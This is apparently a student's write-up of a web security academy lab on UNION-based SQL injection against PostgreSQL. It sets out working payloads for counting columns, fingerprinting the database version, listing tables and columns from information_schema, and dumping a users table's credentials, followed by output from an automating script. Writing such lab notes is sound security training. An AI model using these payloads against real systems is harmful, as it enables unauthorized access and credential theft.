@@ -1,0 +1,94 @@
+Lab 09 - SQL injection attack, listing the database contents on non-Oracle databases
+
+End Goals:
+- Determine the table that contains usernames and passwords
+- Determine the relevant columns
+- Output the content of the table
+- Login as the administrator
+
+NO HINTS on table information in this lab. All we know is that we want to login as "administrator" user.
+
+NOTE: We will use Burp from now on, rather than directly inputting the sqli payload in the browser. This helps with encoding issues.
+
+Analysis:
+
+1. Find number of columns
+' ORDER BY 1--
+' ORDER BY 2--
+' ORDER BY 3-- // internal server error
+
+-> 2 columns
+
+2. Find data type of the columns
+' UNION SELECT 'a', NULL--
+' UNION SELECT 'a', 'a'--
+
+-> both columns accept type text
+
+3. Figure out what database type we are working with (Oracle, MySQL, PostgreSQL...)
+
+Refer to lab cheat sheet to check the database version. This will tell us what DB this web page is using.
+The lab says this is a non-Oracle database, so it is one of the following:
+
+' UNION SELECT @@version, NULL-- // internal server error -> not Microsoft
+' UNION SELECT version(), NULL-- // 200 OK
+
+-> PostgreSQL 12.15 (Ubuntu 12.15-0ubuntu0.20.04.1)
+
+4. Output the list of table names in the database
+
+Refer to the lab cheat sheet to check how to list database contents (list tables in a database).
+For PostgreSQL, it's
+- SELECT * FROM information_schema.tables
+- SELECT * FROM information_schema.columns WHERE table_name = 'TABLE-NAME-HERE'
+
+Since the payloads above are "SELECT *", we don't want that. We can only display up to 2 columns due to our product category table
+    having only 2 columns. So, we need to find which table column is relevant to us.
+
+We only care about the table name, so let's refer to the official Postgres doc to find out the column name of table name.
+As of this lab, done in August 2023, the official doc is:
+https://www.postgresql.org/docs/current/infoschema-columns.html
+
+Look up "information_schema.tables postgresql" on Google, click the Postgres documentation, click on "columns".
+
+So, the UNION-based sqli payload would be...
+
+' UNION SELECT table_name, NULL FROM information_schema.tables--
+
+-> successfully listed the tables in this database
+
+4.1 Identify the relevant database
+
+-> users_lyfprn
+
+5. Output the column names of the table
+
+Once again, refer to the official Postgres doc to find the syntax to display the column names of this table
+https://www.postgresql.org/docs/current/infoschema-columns.html
+
+' UNION SELECT column_name, NULL FROM information_schema.columns WHERE table_name = 'users_lyfprn'--
+
+-> password_kjcisv
+-> username_rttxit
+
+6. Display usernames and passwords
+
+Now that we know the relevant table/column names, we can run a specific sqli payload to view the usernames and passwords.
+
+' UNION SELECT username_rttxit, password_kjcisv FROM users_lyfprn--
+
+-> administrator
+-> bxz8ge52zy9e8dxbgqps
+
+Logged in successfully!
+
+================================================================================================================================================
+Python script usage and output:
+
+┌──(kali㉿kali)-[~/Downloads/SQL-Injection-Labs/lab-09]
+└─$ python3 sqli-lab-09.py "https://0acb00eb037db697804976430017006c.web-security-academy.net"
+[+] Looking for a users table...
+[+] Found the users table name: users_hsufdx
+[+] Found the username column name: username_sfvxme
+[+] Found the password column name: password_yctjuz
+[+] Found the administrator password: 25bqccg22dg7tnl6grkm
